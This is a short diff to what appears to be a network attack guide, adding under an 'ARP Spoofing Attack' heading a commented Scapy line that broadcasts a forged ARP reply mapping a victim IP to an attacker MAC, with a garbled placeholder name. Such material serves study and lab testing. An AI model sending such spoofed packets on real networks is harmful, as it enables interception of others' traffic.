@@ -372,6 +372,7 @@ cat /proc/sys/net/ipv4/ip_forward
 #### ARP Spoofing Attack
 
 ```python
+# sendp(Ether(src="<attackẻ_mac>", dst="ff:ff:ff:ff:ff:ff") / ARP(op="is-at", psrc="<victim_ip>", hwsrc="<attackẻ_mac>"), iface="eth0")
 from scapy.all import *
 import time
 
